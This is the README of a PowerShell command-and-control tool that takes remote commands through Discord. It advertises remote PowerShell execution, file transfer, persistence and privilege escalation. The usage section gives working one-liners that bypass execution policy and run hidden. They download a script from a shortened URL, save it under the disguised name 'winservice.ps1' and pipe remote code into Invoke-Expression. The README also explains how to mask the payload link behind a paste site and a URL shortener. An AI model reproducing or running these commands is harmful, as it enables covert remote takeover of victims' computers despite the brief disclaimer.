# pwshdc-c2
A PowerShell Discord bot for remote command execution, in development

**Disclaimer**: This project should be used for authorized testing or educational purposes only.

## Features
- **Multiple Connections at the same time**
- **Execute PowerShell commands remotely**
- **File upload/download**
- **Add/Remove Persistence**
- **Privilege escalation**

## Usage
In cmd or powershell
```powershell
.\pwshdc.ps1 -tk 'bot-token' 'channel-id-from-server'
```

Or in a multi-step process for WIN+R execution

```powershell
powershell -NoP -Ep Bypass -Command "iwr -UseBasicParsing https://is.gd/zVzeNh -OutFile $env:TEMP\winservice.ps1; powershell -NoP -Ep Bypass -File $env:TEMP\winservice.ps1 -tk 'YOUR-TOKEN' -cid 'CHANNEL-ID'"
```

Put the Script from above in (https://raw-paste.vercel.app/), copy raw file link. Then paste the link into https://is.gd/ to make it shorter.

Then put this into WIN+R: 
```powershell
powershell -nop -ep bypass -W H -c "iwr https://YOUR-SHORTEN-LINK/ | iex"
```
